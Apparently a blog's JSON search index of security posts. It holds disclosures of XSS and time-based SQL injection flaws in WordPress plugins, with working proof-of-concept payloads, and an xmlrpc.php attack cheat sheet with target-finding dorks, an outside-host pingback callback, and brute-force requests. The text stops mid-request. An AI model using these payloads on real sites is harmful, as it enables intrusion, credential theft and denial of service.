[ { "title": "Wordpress About Author <= 1.3.9 Authenticated Stored XSS", "url": "/nitesculucian.github.io/2019/10/25/about-author-1-3-9-authentificated-stored-xss-vulnerability/", "categories": "dctf, ctf, writeups", "tags": "DCTF, DefCamp, 2017, writeups, CTF, challange", "date": "2019-10-25 17:24:00 +0300", "snippet": "A vulnerability has been identified in the WordPress “About Author” plugin versions lower than or equal to 1.3.9. This plugin is affected by an authenticated Stored Cross-site scripting (XSS) vulne...", "content": "A vulnerability has been identified in the WordPress “About Author” plugin versions lower than or equal to 1.3.9. This plugin is affected by an authenticated Stored Cross-site scripting (XSS) vulnerability. This means that an attacker with a valid account on the WordPress website could inject malicious code into the plugin, which could be executed whenever a user views the affected page. This can lead to various malicious actions such as stealing sensitive user information, spreading malware, or taking control of the affected website. It is recommended to update the plugin to its latest version as soon as possible to prevent any potential attacks.Intial submission of the vulnerability# Exploit Title: Wordpress About Author &lt;= 1.3.9 Authenticated Stored XSS Vulnerability# Date: 25-10-2019# Exploit Author: Lucian Ioan Nitescu# Contact: https://twitter.com/LucianNitescu# Webiste: https://nitesculucian.github.io# Vendor Homepage: https://weblizar.com/plugins/about-author-pro/# Software Link: https://wordpress.org/plugins/about-author/# Version: 1.3.9# Tested on: Ubuntu 18.04 / Wordpress 5.3 1. Description: Wordpress About Author plugin with a version lower or equal with 1.3.9 is affected by an authenticated Stored Cross-site scripting (XSS) vulnerability.2. Proof of Concept: Stored Cross-site scripting (XSS)- Using an Wordpress user, access &lt; your_target &gt; /wp-admin/post-new.php?post_type=about_author (About Author &gt; Add new)- Insert in post_title input the following payload: `\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;`- Save. The Stored Cross-site scripting (XSS) vulnerability is affecting all pages/routes within the Wordpress Admin panel.Stored response output:```&lt;div id=\"AMSA\" style=\"display:none;\"&gt;&lt;h3&gt;Select About Author Shortcode And Widget To Insert Into Post&lt;/h3&gt;&lt;select id=\"Ab_Tm_ME\"&gt;&lt;option value='5748'&gt;wqddqwqd&lt;/option&gt;&lt;option value='5749'&gt;ads&lt;/option&gt;&lt;option value='5751'&gt;\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/option&gt;&lt;/select&gt;&lt;button class='button primary' id='Ab_tm_insert'&gt;Insert About Author Shortcode&lt;/button&gt;&lt;/div&gt;```Detailed analysis of the vulnerabilityBy going within the admin panel at About Author &gt; Add new, we can add the following payload \"&gt;&lt;script&gt;alert(1)&lt;/script&gt;. This is not the issue; XSS vulnerabilities are mainly output-related issues. Therefore, by looking at /wp-content/plugins/about-author at lines 335-353, we can observe the following unescaped output of user-supplied data on line 345 that leads to the stored XSS by outputting database stored data.&lt;div id=\"AMSA\" style=\"display:none;\"&gt;\t&lt;?php $all_posts = wp_count_posts( 'about_author')-&gt;publish;\tif(!$all_posts==null) {?&gt;\t&lt;h3&gt;&lt;?php esc_html_e('Select About Author Shortcode And Widget To Insert Into Post','WL_ABTM_TXT_DM');?&gt;&lt;/h3&gt;\t&lt;select id=\"Ab_Tm_ME\"&gt;\t\t&lt;?php\t\tglobal $wpdb;\t\t$A_B_T_shortcodegallerys = $wpdb-&gt;get_results(\"SELECT post_title, ID FROM $wpdb-&gt;posts WHERE post_status = 'publish'\tAND post_type='about_author' \");\t\tforeach ($A_B_T_shortcodegallerys as $A_B_T_shortcodegallery) {\t\t\tif($A_B_T_shortcodegallery-&gt;post_title) { $title_var=$A_B_T_shortcodegallery-&gt;post_title;} else { $title_var=\"(no title)\"; }\t\t\techo \"&lt;option value='\".$A_B_T_shortcodegallery-&gt;ID.\"'&gt;\".$title_var.\"&lt;/option&gt;\";\t\t} ?&gt;\t&lt;/select&gt;\t&lt;button class='button primary' id='Ab_tm_insert'&gt;&lt;?php esc_html_e('Insert About Author Shortcode','WL_ABTM_TXT_DM');?&gt;&lt;/button&gt;\t&lt;?php } else { ?&gt;\t\t&lt;h1 align=\"center\"&gt; &lt;?php esc_html_e( 'No About Author Shortcode not_found ', 'WL_ABTM_TXT_DM' ); ?&gt; &lt;/h1&gt;&lt;?php\t}\t?&gt;&lt;/div&gt;The successful exploitation of the vulnerability looks as follows in the HTML output:&lt;div id=\"AMSA\" style=\"display:none;\"&gt;&lt;h3&gt;Select About Author Shortcode And Widget To Insert Into Post&lt;/h3&gt;&lt;select id=\"Ab_Tm_ME\"&gt;&lt;option value='5748'&gt;wqddqwqd&lt;/option&gt;&lt;option value='5749'&gt;ads&lt;/option&gt;&lt;option value='5751'&gt;\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/option&gt;&lt;/select&gt;&lt;button class='button primary' id='Ab_tm_insert'&gt;Insert About Author Shortcode&lt;/button&gt;&lt;/div&gt;Note that, due to the style=\"display:none;\" of the div tag, the vulnerability was available on all pages of the WordPress Admin panel. Keep in mind that \"&gt;&lt;script&gt;alert(1)&lt;/script&gt; will be executed regardless of the style=\"display:none;\".How to fixUpdate to the latest available version of the About Author plugin.Public appearances https://plugins.svn.wordpress.org/about-author/trunk/readme.txtOther references https://www.acunetix.com/vulnerabilities/web/wordpress-plugin-about-author-cross-site-scripting-1-3-9/" }, { "title": "Wordpress Groundhogg <= 2.0.8.1 Authentificated Reflected XSS", "url": "/nitesculucian.github.io/2019/10/23/groundhogg-1-3-2-authentificated-reflected-xss-vulnerability/", "categories": "my_exploits, offensive_security", "tags": "exploit, vulnerability, reflected xss, Cross-site scripting (reflected), Groundhogg, Authenticated", "date": "2019-10-23 21:50:00 +0300", "snippet": "Wordpress Groundhogg plugin with a version lower then 2.0.8.1 is affected by an authenticated Reflected Cross-site scripting (XSS) vulnerability.Intial submission of the vulnerability# Exploit Titl...", "content": "Wordpress Groundhogg plugin with a version lower then 2.0.8.1 is affected by an authenticated Reflected Cross-site scripting (XSS) vulnerability.Intial submission of the vulnerability# Exploit Title: Wordpress Groundhogg &lt;= 2.0.8.1 Authenticated Reflected XSS Vulnerability# Date: 22-10-2019# Exploit Author: Lucian Ioan Nitescu# Contact: https://twitter.com/LucianNitescu# Webiste: https://nitesculucian.github.io# Vendor Homepage: https://www.groundhogg.io/# Software Link: https://wordpress.org/plugins/groundhogg/# Version: 2.0.8.1# Tested on: Ubuntu 18.04 / Wordpress 5.3 1. Description: Wordpress Groundhogg plugin with a version lower then 2.0.8.1 is affected by an authenticated Reflected Cross-site scripting (XSS) vulnerability.2. Proof of Concept: Reflected Cross-site scripting (XSS)- Using an Wordpress user, access &lt; your_target &gt; /wp-admin/admin.php?page=gh_bulk_jobs&amp;action=gh_export_contacts&lt;%2Fscript&gt;&lt;script&gt;alert(1)&lt;%2Fscript&gt;- The response will contain:```bulk_action: 'groundhogg/bulk_job/gh_export_contacts&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;/ajax', items: bp.getItems(), the_end: bp.isLastOfThem() },```Detailed analysis of the vulnerabilityOn wp-content/plugins/groundhogg/includes/admin/bulk-jobs/class-wpgh-admin-bulk-job.php at line 217, we can observe that in the middle of &lt;script&gt; ... &lt;/script&gt; tags there is an unescaped echo of user-supplied data in the form of URL paths.$.ajax({ type: \"post\", url: ajaxurl, dataType: 'json', data: { action: 'bulk_action_listener', bulk_action: '&lt;?php echo \"groundhogg/bulk_job/{$this-&gt;get_action()}/ajax\" ?&gt;', items: bp.getItems(), the_end: bp.isLastOfThem() }, success: function( response ){This vulnerability could be easily exploited by accessing example.com/wp-admin/admin.php?page=gh_bulk_jobs&amp;action=gh_export_contacts&lt;%2Fscript&gt;&lt;script&gt;alert(1)&lt;%2Fscript&gt; where example.com is your target.How to fixUpdate to the latest available version of the Groundhogg plugin.Public appearances tbaOther references Thanks to @pluginvulns for this: https://twitter.com/pluginvulns/status/1187108581839007744" }, { "title": "Wordpress Groundhogg <= 1.3.11.13 Authentificated SQL Injection", "url": "/nitesculucian.github.io/2019/10/23/groundhogg-1-3-2-authentificated-sql-injection-vulnerability/", "categories": "my_exploits, offensive_security", "tags": "exploit, vulnerability, sql, injection, Groundhogg, wordpress, Authenticated", "date": "2019-10-23 17:47:00 +0300", "snippet": "Wordpress Groundhogg plugin with a version lower than 1.3.11.13 is affected by an Authenticated SQL Injection vulnerability.Intial submission of the vulnerability# Exploit Title: Wordpress Groundho...", "content": "Wordpress Groundhogg plugin with a version lower than 1.3.11.13 is affected by an Authenticated SQL Injection vulnerability.Intial submission of the vulnerability# Exploit Title: Wordpress Groundhogg &lt;= 1.3.11.13 Authenticated SQL Injection Vulnerability# Date: 23-10-2019# Exploit Author: Lucian Ioan Nitescu# Contact: https://twitter.com/LucianNitescu# Webiste: https://nitesculucian.github.io# Vendor Homepage: https://www.groundhogg.io/# Software Link: https://wordpress.org/plugins/groundhogg/# Version: 1.3.11.13# Tested on: Ubuntu 18.04 / Wordpress 5.3 1. Description: Wordpress Groundhogg plugin with a version lower than 1.3.11.13 is affected by an Authenticated SQL Injection vulnerability.2. Proof of Concept: Authenticated SQL Injection:- Using an Wordpress user, access &lt;your target&gt; /wp-admin/admin.php?page=gh_bulk_jobs&amp;action=gh_export_contacts&amp;optin_status%5B0%5D=(select*from(select(sleep(20)))a)&amp;optin_status%5B1%5D=0- The response will be returned after 20 seconds proving the successful exploitation of the vulnerability.- Sqlmap can be used to further exploit the vulnerability.Detailed analysis of the vulnerabilityThe function from /wp-content/plugins/groundhogg/includes/admin/tools/class-wpgh-export-bulk-job.php from lines 38-51 is accepting arbitrary user-supplied data as follows:public function query($items){ if ( ! current_user_can( 'export_contacts' ) ){ return $items; } $query = new WPGH_Contact_Query(); $args = $_GET; $contacts = $query-&gt;query( $args ); $ids = wp_list_pluck( $contacts, 'ID' ); return $ids;}The line containing $contacts = $query-&gt;query( $args ); allows unsanitised user input within the following function from /wp-content/plugins/groundhogg/includes/class-wpgh-contact-query.php lines 279-284:public function query( $query ) { $this-&gt;query_vars = wp_parse_args( $query ); $items = $this-&gt;get_items(); return $items;}Finaly the unsinitised query is perfomed on wp-content/plugins/groundhogg/includes/class-wpgh-contact-query.php at line 430 ( WPGH_Contact_Query-&gt;query_items() ):$results = $wpdb-&gt;get_results( $this-&gt;request );return $results;How to fixUpdate to the latest available version of the Groundhogg plugin.Public appearances tbaOther references tba" }, { "title": "Wordpress Sliced Invoices <= 3.8.2 Authenticated SQL Injection", "url": "/nitesculucian.github.io/2019/10/23/sliced-invoices-3-8-2-authentificated-sql-injection-vulnerability/", "categories": "my_exploits, offensive_security", "tags": "exploit, vulnerability, sql, injection, sliced, invoice, Authenticated", "date": "2019-10-23 01:26:00 +0300", "snippet": "Wordpress Sliced Invoices plugin with a version lower then 3.8.2 is affected by an Authenticated SQL Injection vulnerability. Note that this vulnerability is highly similar to Wordpress Sliced Invo...", "content": "Wordpress Sliced Invoices plugin with a version lower then 3.8.2 is affected by an Authenticated SQL Injection vulnerability. Note that this vulnerability is highly similar to Wordpress Sliced Invoices &lt;= 3.8.2 Authenticated Reflected XSS due to the use of the same GET parameter.Intial submission of the vulnerability# Exploit Title: Wordpress Sliced Invoices &lt;= 3.8.2 Authenticated SQL Injection Vulnerability# Date: 22-10-2019# Exploit Author: Lucian Ioan Nitescu# Contact: https://twitter.com/LucianNitescu# Webiste: https://nitesculucian.github.io# Vendor Homepage: https://slicedinvoices.com/# Software Link: https://wordpress.org/plugins/sliced-invoices/# Version: 3.8.2# Tested on: Ubuntu 18.04 / Wordpress 5.3 1. Description: Wordpress Sliced Invoices plugin with a version lower then 3.8.2 is affected by an Authenticated SQL Injection vulnerability.2. Proof of Concept: Authenticated SQL Injection:- Using an Wordpress user, access &lt;your target&gt; /wp-admin/admin.php?action=duplicate_quote_invoice&amp;post=8%20and%20(select*from(select(sleep(20)))a)--%20- The response will be returned after 20 seconds proving the successful exploitation of the vulnerability.- Sqlmap can be used to further exploit the vulnerability.Detailed analysis of the vulnerabilityUnder wp-content/plugins/sliced-invoices/admin/class-sliced-admin.php at line number 2202 we can observe the use of non parameterized queries using $wpdb-&gt;get_results() with user-supplied data:$post_meta_infos = (\"SELECT meta_key, meta_value FROM $wpdb-&gt;postmeta WHERE post_id=$post_id\");Where the $post_id variable is assigned on line 2154 as:/** get the original post id*/$post_id = (isset($_GET['post']) ? $_GET['post'] : $_POST['post']);This vulnerability could be easily exploited by accessing example.com/wp-admin/admin.php?action=duplicate_quote_invoice&amp;post=8%20and%20(select*from(select(sleep(20)))a)--%20 where example.com is your target. To retrieve more data you can use the sqlmap tool over the affected target URL.How to fixUpdate to the latest available version of the Sliced Invoices plugin.Public appearances Exploit Database: https://www.exploit-db.com/exploits/47540 Packet Storm: https://packetstormsecurity.com/files/154953/WordPress-Sliced-Invoices-3.8.2-SQL-Injection.htmlOther references WPVDB: https://wpvulndb.com/vulnerabilities/9920" }, { "title": "Wordpress Sliced Invoices <= 3.8.2 Authenticated Reflected XSS", "url": "/nitesculucian.github.io/2019/10/22/sliced-invoices-3-8-2-authentificated-reflected-xss-vulnerability/", "categories": "my_exploits, offensive_security", "tags": "exploit, vulnerability, Cross-site scripting (reflected), sliced, invoice, Authenticated", "date": "2019-10-22 23:33:00 +0300", "snippet": "Wordpress Sliced Invoices plugin with a version lower then 3.8.2 is affected by an authenticated Reflected Cross-site scripting (XSS) vulnerability.Intial submission of the vulnerability# Exploit T...", "content": "Wordpress Sliced Invoices plugin with a version lower then 3.8.2 is affected by an authenticated Reflected Cross-site scripting (XSS) vulnerability.Intial submission of the vulnerability# Exploit Title: Wordpress Sliced Invoices &lt;= 3.8.2 Authenticated Reflected XSS Vulnerability# Date: 22-10-2019# Exploit Author: Lucian Ioan Nitescu# Contact: https://twitter.com/LucianNitescu# Webiste: https://nitesculucian.github.io# Vendor Homepage: https://slicedinvoices.com/# Software Link: https://wordpress.org/plugins/sliced-invoices/# Version: 3.8.2# Tested on: Ubuntu 18.04 / Wordpress 5.3 1. Description: Wordpress Sliced Invoices plugin with a version lower then 3.8.2 is affected by an authenticated Reflected Cross-site scripting (XSS) vulnerability.2. Proof of Concept: Reflected Cross-site scripting (XSS)- Using an Wordpress user, access &lt; your_target &gt; /wp-admin/admin.php?action=duplicate_quote_invoice&amp;post=%3Cscript%3Ealert(1)%3C%2fscript%3E- The response will contain:```&lt;body id=\"error-page\"&gt;\t&lt;p&gt;Creation failed, could not find original invoice or quote: &lt;script&gt;alert(1)&lt;/script&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;```Detailed analysis of the vulnerabilityUnder wp-content/plugins/sliced-invoices/admin/class-sliced-admin.php at line number 2236 we can observe the following unescaped output of user-supplied data:wp_die('Creation failed, could not find original invoice or quote: ' . $post_id);Where the $post_id variable is assigned on line 2154 as:/** get the original post id*/$post_id = (isset($_GET['post']) ? $_GET['post'] : $_POST['post']);This vulnerability could be easily exploited by accessing example.com/wp-admin/admin.php?action=duplicate_quote_invoice&amp;post=%3Cscript%3Ealert(1)%3C%2fscript%3E where example.com is your target.How to fixUpdate to the latest available version of the Sliced Invoices plugin.Public appearances Packet Storm: https://packetstormsecurity.com/files/154952/WordPress-Sliced-Invoices-3.8.2-Cross-Site-Scripting.htmlOther references WPVDB: https://wpvulndb.com/vulnerabilities/9920" }, { "title": "Exploiting the xmlrpc.php on all WordPress versions", "url": "/nitesculucian.github.io/2019/07/02/exploiting-the-xmlrpc-php-on-all-wordpress-versions/", "categories": "cheatsheet, offensive_security, wordpress", "tags": "offensive security, wordpress, bypass, cloudflare, callback, pingback, methods, ddos, dos, bruteforce", "date": "2019-07-02 02:37:00 +0300", "snippet": "XML-RPC on WordPress is actually an API that allows developers who make 3rd party application and services the ability to interact to your WordPress site. The XML-RPC API that WordPress provides se...", "content": "XML-RPC on WordPress is actually an API that allows developers who make 3rd party application and services the ability to interact to your WordPress site. The XML-RPC API that WordPress provides several key functionalities that include: Publish a post Edit a post Delete a post. Upload a new file (e.g. an image for a post) Get a list of comments Edit commentsFor instance, the Windows Live Writer system is capable of posting blogs directly to WordPress because of XML-RPC.Unfortunately on the normal installation (not tampered with settings, and/or configs) of WordPress the XML-RPC interface opens two kinds of attacks: XML-RPC pingbacks Brute force attacks via XML-RPCAccording to the WordPress documentation (https://codex.wordpress.org/XML-RPC_Support), XML-RPC functionality is turned on by default since WordPress 3.5.Note that in this tutorial/cheatsheet the domain “example.com” is actually an example and can be replaced with your specific target.Dorks for finding potential targetsI would like to add that any illegal action is your own, and I can not be held responsible for your actions against a vulnerable target. Test only where you are allowed to do so. Go for the public, known bug bounties and earn your respect within the community.That’s being said, during bug bounties or penetration testing assessments I had to identify all vulnerable WordPress targets on all subdomains following the rule *.example.com. In this specific case I relied on Google dorks in order to fast discovery all potential targets: inurl:\"/xmlrpc.php?rsd\" + scoping restrictions intitle:\"WordPress\" inurl:\"readme.html\" + scoping restrictions = general wordpress detection allinurl:\"wp-content/plugins/\" + scoping restrictions = general wordpress detectionSearching for XML-RPC servers on WordPress:Steps to check: Ensure you are targeting a WordPress site. Ensure you have access to the xmlrpc.php file. In general, it is found at https://example.com/xmlrpc.php and would reply to a GET request with: XML-RPC server accepts POST requests only. It will be pointless to target an XML-RPC server which is disabled/hardcoded/tampered/not working. Therefore, we will check its functionality by sending the following request:Post Request:POST /xmlrpc.php HTTP/1.1Host: example.comContent-Length: 135&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;methodCall&gt; &lt;methodName&gt;system.listMethods&lt;/methodName&gt; &lt;params&gt;&lt;/params&gt; &lt;/methodCall&gt;The normal response should be:HTTP/1.1 200 OKDate: Mon, 01 Jul 2019 17:13:30 GMTServer: ApacheStrict-Transport-Security: max-age=63072000; includeSubdomains; preloadConnection: closeVary: Accept-EncodingReferrer-Policy: no-referrer-when-downgradeContent-Length: 4272Content-Type: text/xml; charset=UTF-8&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;methodResponse&gt; &lt;params&gt; &lt;param&gt; &lt;value&gt; &lt;array&gt;&lt;data&gt; &lt;value&gt;&lt;string&gt;system.multicall&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;system.listMethods&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;system.getCapabilities&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;demo.addTwoNumbers&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;demo.sayHello&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;pingback.extensions.getPingbacks&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;pingback.ping&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;mt.publishPost&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;mt.getTrackbackPings&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;mt.supportedTextFilters&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;mt.supportedMethods&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;mt.setPostCategories&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;mt.getPostCategories&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;mt.getRecentPostTitles&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;mt.getCategoryList&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;metaWeblog.getUsersBlogs&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;metaWeblog.deletePost&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;metaWeblog.newMediaObject&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;metaWeblog.getCategories&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;metaWeblog.getRecentPosts&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;metaWeblog.getPost&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;metaWeblog.editPost&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;metaWeblog.newPost&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;blogger.deletePost&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;blogger.editPost&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;blogger.newPost&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;blogger.getRecentPosts&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;blogger.getPost&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;blogger.getUserInfo&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;blogger.getUsersBlogs&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.restoreRevision&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.getRevisions&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.getPostTypes&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.getPostType&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.getPostFormats&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.getMediaLibrary&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.getMediaItem&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.getCommentStatusList&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.newComment&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.editComment&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.deleteComment&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.getComments&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.getComment&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.setOptions&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.getOptions&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.getPageTemplates&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.getPageStatusList&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.getPostStatusList&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.getCommentCount&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.deleteFile&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.uploadFile&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.suggestCategories&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.deleteCategory&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.newCategory&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.getTags&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.getCategories&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.getAuthors&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.getPageList&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.editPage&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.deletePage&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.newPage&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.getPages&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.getPage&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.editProfile&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.getProfile&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.getUsers&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.getUser&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.getTaxonomies&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.getTaxonomy&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.getTerms&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.getTerm&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.deleteTerm&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.editTerm&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.newTerm&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.getPosts&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.getPost&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.deletePost&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.editPost&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.newPost&lt;/string&gt;&lt;/value&gt; &lt;value&gt;&lt;string&gt;wp.getUsersBlogs&lt;/string&gt;&lt;/value&gt;&lt;/data&gt;&lt;/array&gt; &lt;/value&gt; &lt;/param&gt; &lt;/params&gt;&lt;/methodResponse&gt;Note that in the absence of the above-presented example response, it is rather pointless to proceed with actual testing of the two vulnerabilities. The response might vary based on the settings and configurations of the WordPress installation. If there is an output for &lt;methodName&gt;system.listMethods&lt;/methodName&gt; then it is recommended to interact with at least the most basic method called demo.sayHello.Request:POST /xmlrpc.php HTTP/1.1Host: example.comContent-Length: 130&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;methodCall&gt; &lt;methodName&gt;demo.sayHello&lt;/methodName&gt; &lt;params&gt;&lt;/params&gt; &lt;/methodCall&gt;Response:HTTP/1.1 200 OKDate: Mon, 01 Jul 2019 17:19:05 GMTServer: ApacheStrict-Transport-Security: max-age=63072000; includeSubdomains; preloadConnection: closeVary: Accept-EncodingReferrer-Policy: no-referrer-when-downgradeContent-Length: 181Content-Type: text/xml; charset=UTF-8&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;methodResponse&gt; &lt;params&gt; &lt;param&gt; &lt;value&gt; &lt;string&gt;Hello!&lt;/string&gt; &lt;/value&gt; &lt;/param&gt; &lt;/params&gt;&lt;/methodResponse&gt;XML-RPC pingbacks attacksIn this case, an attacker is able to leverage the default XML-RPC API in order to perform callbacks for the following purposes: Distributed denial-of-service (DDoS) attacks - An attacker executes the pingback.ping the method from several affected WordPress installations against a single unprotected target (botnet level). Cloudflare Protection Bypass - An attacker executes the pingback.ping the method from a single affected WordPress installation which is protected by CloudFlare to an attacker-controlled public host (for example a VPS) in order to reveal the public IP of the target, therefore bypassing any DNS level protection. XSPA (Cross Site Port Attack) - An attacker can execute the pingback.ping the method from a single affected WordPress installation to the same host (or other internal/private host) on different ports. An open port or an internal host can be determined by observing the difference in time of response and/or by looking at the response of the request.The following represents an simple example request using the PostBin provided URL as callback:POST /xmlrpc.php HTTP/1.1Host: example.comContent-Length: 303&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;methodCall&gt;&lt;methodName&gt;pingback.ping&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;https://postb.in/1562017983221-4377199190203&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;https://example.com/&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;Example response:HTTP/1.1 200 OKDate: Mon, 01 Jul 2019 21:53:56 GMTServer: ApacheStrict-Transport-Security: max-age=63072000; includeSubdomains; preloadConnection: closeVary: Accept-EncodingReferrer-Policy: no-referrer-when-downgradeContent-Length: 370Content-Type: text/xml; charset=UTF-8&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;methodResponse&gt; &lt;fault&gt; &lt;value&gt; &lt;struct&gt; &lt;member&gt; &lt;name&gt;faultCode&lt;/name&gt; &lt;value&gt;&lt;int&gt;0&lt;/int&gt;&lt;/value&gt; &lt;/member&gt; &lt;member&gt; &lt;name&gt;faultString&lt;/name&gt; &lt;value&gt;&lt;string&gt;&lt;/string&gt;&lt;/value&gt; &lt;/member&gt; &lt;/struct&gt; &lt;/value&gt; &lt;/fault&gt;&lt;/methodResponse&gt;PostBin Output:Brute force attacksSometimes the only way to bypass request limiting or blocking in a brute force attack against WordPress site is to use the all too forgotten XML-RPC API.The following request represents the most common brute force attack:POST /xmlrpc.php HTTP/1.1Host: example.comContent-Length: 235&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;methodCall&gt; &lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt; &lt;params&gt; &lt;param&gt;&lt;value&gt;\\{\\{your username\\}\\}&lt;/value&gt;&lt;/param&gt; &lt;param&gt;&lt;value&gt;\\{\\{your password\\}\\}&lt;/value&gt;&lt;/param&gt; &lt;/params&gt; &lt;/methodCall&gt;The above request can be sent in Burp Intruder (for example) with different sets of credentials. Note that, even if you guess the password or not, the response code will always be 200. I highly recommend looking for errors/messages within the body of the response.Worried about sending way to much requests against the target? - No worries. WordPress XML-RPC by default allows an attacker to perform a single request, and brute force hundreds of passwords.The following request requires permissions for both system.multicall and wp.getUsersBlogs methods:POST /xmlrpc.php HTTP/1.1Host: example.comContent-Length: 1560&lt;?xml 